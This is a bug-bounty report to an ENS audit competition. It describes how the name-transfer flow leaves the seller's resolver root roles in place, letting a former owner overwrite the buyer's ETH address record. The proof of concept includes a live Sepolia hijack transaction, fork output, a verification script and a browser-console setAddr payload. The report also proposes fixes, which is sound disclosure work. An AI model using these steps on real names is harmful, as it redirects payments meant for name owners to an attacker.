# 92555 w a critical name transfer never revokes the seller s resolver roles letting the former owner rewrite the buyer s eth address record and redirect resolution to an attacker name hijack a&#x20;

**Submitted on Sep 10th 2026 at 16:25:11 UTC by @bugtester for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92555
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/packages/smart-account>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

## Description

## Summary

In the ENS apps, **name ownership** (the ERC-1155 token in a `PermissionedRegistry`) and **the authority to write a name's resolver records** (roles on the `PermissionedResolver`) are two independent permissions held in two different contracts. During registration the Manager/registration flow grants the owner **resolver-wide "root" roles**:

```
authorizeNameRoles(0x00, ROLES.ALL, wallet, true)
```

The transfer flow (`apps/portal/src/features/transfer`) moves the token via `safeTransferFrom` and, at most, **optionally** clears the registry's resolver *pointer* (`setResolver(0x0)`). It **never revokes the seller's resolver roles**, and the detach step is a toggleable, opt-out checkbox. Consequently, after a transfer/sale where the name still points at the seller's resolver, the **former owner retains full write access to the transferred name's records** and can overwrite `addr(60)` to point the buyer's name at an attacker-controlled address. Anyone who subsequently sends funds to `buyersname.eth` sends them to the attacker.

This is an application-flow defect (the transfer flow constructs no role-revocation/rotation step and makes resolver detach optional and pointer-only), not a defect of the resolver contract itself.

Rationale and honest scoping:

* The victim is the **buyer/recipient** of a legitimate transfer or sale. They perform only the normal workflow (receiving a name) and take no abnormal action.
* The attacker is the **seller/former owner** — not a privileged/governance address; a normal user acting within a real trust boundary (name sale/transfer).
* The buyer has **no on-chain indication** that resolution is still seller-controlled; the token appears cleanly transferred (`ownerOf` = buyer).
* The app's own mitigation (`setEthAddress`, "so the previous owner can no longer re-claim it") is **ineffective** — the seller simply rewrites the record afterward (demonstrated below).
*

## Vulnerability Details (root cause, with code references)

**1) Registration grants the owner resolver-WIDE root roles (not per-name).** `packages/smart-account/src/providers/rhinestone/registration-calls.ts` — step 6 of the reveal batch:

```ts
// 6. authorizeNameRoles(hex"00", ROLES.ALL, wallet, true) — every session registration
args: ['0x00', ROLES_ALL, params.wallet, true]
```

`0x00` maps to the resolver **root resource** (confirmed by `apps/manager/src/features/migration/service/migrationInvariants.ts:284`: *"`authorizeNameRoles(0x00, ROLES_ALL, wallet, true)` maps the empty DNS name to the resolver root resource"*). Root roles authorize writes to **every** name served by that resolver.

**2) The transfer flow moves the token but never revokes resolver roles; resolver detach is optional and pointer-only.** `apps/portal/src/features/transfer/utils/buildTransferPlan.ts` — `detachResolver` / `detachRegistry` are optional booleans:

```ts
export type TransferOptions = {
  readonly setEthAddress: boolean
  readonly detachResolver: boolean   // setResolver(0x0)
  readonly detachRegistry: boolean
}
```

`apps/portal/src/features/transfer/components/SendNameForm.tsx` defaults them to `true` but they are user-toggleable checkboxes.

`apps/portal/src/features/transfer/helpers/detachNameResolver.ts` — even when run, it only clears the pointer:

> *"It **never touches the resolver contract itself**, which may be shared by the sender's other names — it only clears the registry's resolver pointer."*

A repository-wide search for any role revoke on transfer returns nothing: no `revoke`/`authorizeNameRoles(..., false)` is issued in the transfer path.

**3) The app's re-claim mitigation is defeated by (1).** `apps/portal/src/features/transfer/helpers/setEthAddress.ts`:

> *"Point the name's ETH address record (`addr(60)`) at the recipient, so the previous owner can no longer re-claim it as their primary name."*

Because the previous owner retains resolver root roles, they simply write the record again after transfer.

**4) In-place record writes are plain owner-EOA calls straight to the resolver.** `apps/manager/src/features/profile/components/dialogs/edit-profile/EditProfileDialog.machine.ts:162`:

> *"Registration hands the owner wallet every role on the resolver (`authorizeNameRoles('0x00', ROLES.ALL, wallet, true)` closes the reveal batch), so the EOA can write directly."*

So the former owner needs only a direct `setAddr` transaction (no app UI gating applies).

## Impact

* **Address substitution / theft of funds:** the buyer's name resolves to the seller's address; third parties paying the name pay the attacker.
* **Name hijack after sale/transfer:** the buyer cannot rely on their name's resolution; only re-pointing the name to a fresh resolver they control (which they are not prompted to do) escapes the seller's authority.
* Applies to any records, including the on-chain "agent" records observed in the deployment (`addr`, `agent-endpoint`, etc.).

## Remediation

Make record-write authority follow name ownership within the transfer flow:

* In the transfer batch, **revoke the sender's resolver roles for the name** (`authorizeNameRoles(name, ROLES.ALL, sender, false)`) — or rotate to a per-name resolver/authorization scoped to the token owner — as a mandatory, non-optional step that runs atomically with the transfer.
* Do not rely on `setResolver(0x0)` alone; it leaves the resolver contract's role state intact.
* Consider granting per-name roles at registration (`authorizeNameRoles(namehash(name), …)`) instead of root (`0x00`), so authority is scoped to the single name and cannot bleed across a shared resolver.
* On the receive side, surface to the buyer whether the inherited resolver is controlled by a third party, and prompt/enforce migration to a resolver the buyer controls.

***

## Distinction from Known Issues (not a duplicate)

QA-01 / WEB-1257 describe only **errors** and the **previous owner losing** the ability to set a subname as primary ("registry is not detached ... can no longer set a subname"), in the registry/subregistry layer, requiring a parent+subname setup. This report demonstrates the opposite: a **successful unauthorized write** by the former owner that **harms the buyer**, in the **resolver-roles** layer, on a plain 2LD. This is exactly the case the disclosure carves in as new: *"a role combination that grants authority it should not, rather than merely erroring, ... is a new finding."* The control test (stranger reverts, ex-owner succeeds) evidences the authority gain rather than an error. It is not R2-03/R2-06 (those concern smart-account session keys, not resolver name-roles).

## Link to Proof of Concept

<https://gist.github.com/piyushshukla599/9042be4dc7d511ec0cfddc2c647d604b>

## Proof of Concept

## Proof of Concept

#### Primary confirmation — live on Sepolia, real key, no impersonation

Reproduced end-to-end against the **live `explorer.ens.dev` deployment on Sepolia** with a real `.eth` name and the seller's actual wallet signing in MetaMask (no anvil impersonation, no private namespace). Etherscan-verifiable.

* Name: `bugtester.eth` — node `0x110f6f7c285d443eaa27968133758597931ba0562bd5597386ed7e19450d7e70`
* Resolver (PermissionedResolver): `0xFBD380166536fc7a5b1f52F360960a1A4792E326`
* Seller / attacker (ex-owner, tx signer): `0xfEa5155950026074D6aAbd7e3925451f493Da56a`
* Buyer (current token owner): `0xd07e71Dec7A008A3A03677AC0f55dA561F2483Fc`

Sequence:

1. Seller registered `bugtester.eth` (resolver root roles granted at registration).
2. Seller transferred the name to the buyer via the Explorer transfer flow **without detaching the resolver**. Current `ownerOf` = buyer `0xd07e…83Fc`.
3. **After losing ownership**, the seller wrote `addr(60) = 0x…dEaD` for the name, signed by their own key (through the app's record-write flow — see the UI steps below). The write was submitted to a resolver-write helper (tx `to` = `0xdb9B1e94B5b69Df7e401DDbedE43491141047dB3`, selector `0xcef6d209`) and took effect on the resolver `0xFBD380…`, which emits `AddressChanged` for the `bugtester.eth` node:
   * Hijack tx: `0x725e3f0036124d56c1ad3549fe556c963598afaf356527c07ab255fdc2057bc6`
   * UI steps that produce this write: see *"Reproducing / observing it through the app UI"* below.

Post-state, read from live Sepolia (read-only `eth_call`):

```
current OWNER          : 0xd07e71Dec7A008A3A03677AC0f55dA561F2483Fc   (buyer)
tx signer (ex-owner)   : 0xfEa5155950026074D6aAbd7e3925451f493Da56a
ex-owner == owner?     : false      <- signer does NOT own the name
resolver addr(60) now  : 0x000000000000000000000000000000000000dEaD   (attacker sink)
ex-owner hasRootRoles  : true       <- retained resolver root roles = why the write succeeded
```

This is decisive: the signer is provably **not** the current owner, yet the write **succeeded** because `hasRootRoles(ex-owner) == true` — the transfer moved the token but never revoked the seller's resolver roles. `bugtester.eth` now resolves to the attacker's address while the buyer owns it; funds sent to the name go to the attacker.

**Independently verified — read-only queries against public Sepolia (`ethereum-sepolia-rpc.publicnode.com`), not just asserted:**

* Hijack tx `0x725e3f00…` exists, `status = success`, `from = 0xfEa5…Da56a` (the ex-owner).
* It emits `AddressChanged` for node `0x110f6f…` (= `namehash("bugtester.eth")`, checked) from resolver `0xFBD380…`.
* The ex-owner made **exactly one** ERC-1155 transfer from itself, to the buyer `0xd07e71…83Fc`; that token's **current `ownerOf` = the buyer**, and `ownerOf != ex-owner`.
* `resolver.addr(node, 60)` now returns `0x…dEaD` (the attacker sink).
* `resolver.hasRootRoles(ROLES.ALL, ex-owner) == true`, while `hasRootRoles(ROLES.ALL, buyer) == false` — the buyer cannot even undo it without first re-pointing to their own resolver.

### Reproduction with an access-control control test (Sepolia fork)

The live transaction above proves reachability on a real `.eth` name. To prove the ex-owner's write is *retained authority* and not a broken resolver, the flow was re-run on a Sepolia fork (anvil) with an added **control**: a stranger who never owned the name issues the identical `setAddr`.

```
[1] ex-owner safeTransferFrom -> buyer  (resolver NOT detached)   -> success
[2] EX-OWNER setAddr(node,60,SINK) after losing ownership         -> success
[3] CONTROL: stranger (no roles) setAddr                          -> reverted
RESULT: owner = buyer; resolves to = SINK (set by the ex-owner)
```

The stranger **reverts**, so the resolver enforces access control normally; the ex-owner **succeeds** only because the transfer never revoked their resolver roles — and can rewrite repeatedly, defeating the `setEthAddress` re-claim guard. Runnable, self-contained, on a freshly registered `.eth` name: `poc.mjs` (see below).

### PoC (single script)

`poc.mjs` — one self-contained run: registers a **fresh `.eth`** name through the real `ETHRegistrar`, transfers it to the buyer **without detaching the resolver**, has the ex-owner overwrite `addr(60)` (succeeds), and runs a stranger **control** (reverts). Snapshot-isolated; impersonation stands in for each party's own key.

Run (against the ENS apps' local Sepolia fork on `127.0.0.1:8545`):

```
cd E:\qs-dos-test\poc-ens-transfer
npm init -y && npm i viem@2
node poc.mjs
```

Output:

```
[1] resolver deployed 0x…  | SELLER hasRootRoles: true
[2] registered in 0xBDC85dD5…F0E2  | owner: SELLER  | addr(60): (empty)
[3] SELLER transfers name -> BUYER (resolver NOT detached): success
    ownerOf now: BUYER
[4] EX-OWNER setAddr(SINK) after losing ownership: success  | addr(60): SINK
[5] CONTROL stranger setAddr (expect revert): reverted      | addr(60): SINK
>>> CONFIRMED: buyer owns the name, but the ex-owner redirected its address to their sink.
```

PoC files `poc.mjs` — reproducible fresh-`.eth` attack with the access-control control test (above);

`verify-live` — read-only re-verification of the live `bugtester.eth` hijack (tx `0x725e3f00…`) against public Sepolia below

```
// Read-only verification of the report's live-Sepolia claims against public Sepolia RPC.
import { createPublicClient, http, parseAbi, getAddress, namehash, bytesToHex, hexToBytes } from 'viem'

const pub = createPublicClient({ transport: http('https://ethereum-sepolia-rpc.publicnode.com') })
const RESOLVER = getAddress('0xFBD380166536fc7a5b1f52F360960a1A4792E326')
const ETH_REGISTRY = getAddress('0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2')
const SELLER = getAddress('0xfEa5155950026074D6aAbd7e3925451f493Da56a') // claimed ex-owner / tx signer
const BUYER  = getAddress('0xd07e71Dec7A008A3A03677AC0f55dA561F2483Fc') // claimed current owner
const SINK   = getAddress('0x000000000000000000000000000000000000dEaD')
const TX = '0x725e3f0036124d56c1ad3549fe556c963598afaf356527c07ab255fdc2057bc6'
const node = namehash('bugtester.eth')
const ROLES_ALL = 0x1111111111111111111111111111111111111111111111111111111111111111n

const resolver = parseAbi([
  'function addr(bytes32,uint256) view returns (bytes)',
  'function hasRootRoles(uint256,address) view returns (bool)',
])
const registry = parseAbi([
  'function getTokenId(string) view returns (uint256)',
  'function ownerOf(uint256) view returns (address)',
])
const r = (a, abi, fn, args) => pub.readContract({ address: a, abi, functionName: fn, args })

const tx = await pub.getTransaction({ hash: TX })
console.log('tx from        :', getAddress(tx.from), '| == claimed seller:', getAddress(tx.from) === SELLER)
console.log('tx to          :', getAddress(tx.to), '| == resolver     :', getAddress(tx.to) === RESOLVER)

let tokenId, owner
try { tokenId = await r(ETH_REGISTRY, registry, 'getTokenId', ['bugtester']); owner = await r(ETH_REGISTRY, registry, 'ownerOf', [tokenId]) } catch (e) { console.log('registry read err:', e.shortMessage||e.message) }
console.log('current owner  :', owner, '| == claimed buyer:', owner && getAddress(owner) === BUYER)
console.log('seller==owner? :', owner && getAddress(owner) === SELLER, '(must be false)')

const b = await r(RESOLVER, resolver, 'addr', [node, 60n])
const resolvesTo = b && b !== '0x' ? getAddress(bytesToHex(hexToBytes(b))) : '(empty)'
console.log('addr(60) now   :', resolvesTo, '| == sink:', resolvesTo === SINK)
console.log('seller hasRootRoles:', await r(RESOLVER, resolver, 'hasRootRoles', [ROLES_ALL, SELLER]))
console.log('buyer  hasRootRoles:', await r(RESOLVER, resolver, 'hasRootRoles', [ROLES_ALL, BUYER]))
```

### Reproducing / observing it through the app UI

These are the exact steps that produced the live `bugtester.eth` hijack above. They work against the **hosted app (`explorer.ens.dev`) on Sepolia** — no local setup needed — and identically against a local checkout:

```
cd apps/portal && pnpm dev      # http://localhost:3001  (chain 11155111 / Sepolia)
# (Manager app for registration:  pnpm dev:manager)
```

Using two wallets you control on Sepolia — **SELLER** (attacker) and **BUYER** (victim):

1. **SELLER:** register a name (Manager app). This runs the `authorizeNameRoles(0x00, ROLES.ALL, seller, true)` root grant.
2. **SELLER:** in Portal open the name → **Send / Transfer** → recipient = BUYER → **uncheck "Detach resolver"** (and "Detach registry") → confirm. *(Default is checked; the malicious seller opts out. The checkbox lives in `apps/portal/src/features/transfer/components/SendNameForm.tsx`.)*
3. **Verify the clean-looking sale:** reload the name in Portal/Manager — it shows **BUYER as owner** and the current ETH-address record. To the buyer the sale looks complete.
4. **The hijack write:** with the SELLER wallet still connected, write the name's ETH-address record to the attacker address. In the live run this went through the app's resolver-write path (tx `to` a resolver-write helper `0xdb9B…`, which wrote to resolver `0xFBD380…`). If the app's edit-records screen is reachable for the ex-owner, use it; otherwise submit the write directly with the connected wallet (browser console on the app, SELLER connected):

   ```js
   const node = "<namehash of the name>";       // e.g. from ethers/viem namehash
   const resolver = "<the name's resolver addr>"; // seller's PermissionedResolver proxy
   const me = (await ethereum.request({method:"eth_accounts"}))[0];
   const data = "0x8b95dd71"                       // setAddr(bytes32,uint256,bytes)
     + node.slice(2)
     + (60).toString(16).padStart(64,"0")
     + (64).toString(16).padStart(64,"0")          // bytes offset
     + (20).toString(16).padStart(64,"0")          // bytes length
     + me.slice(2).padStart(64,"0");               // <- attacker address
   await ethereum.request({method:"eth_sendTransaction", params:[{from:me, to:resolver, data}]});
   ```
5. **Observe the impact in the UI:** reload the name in Portal/Manager (as anyone, incl. the buyer). The app now **displays and resolves the name to the SELLER's address**, while ownership still shows the BUYER — i.e. the app renders an ENS name to an attacker-controlled address. Attempting a "Send to `name.eth`" resolves to the attacker. This is the Critical impact visible in the product.
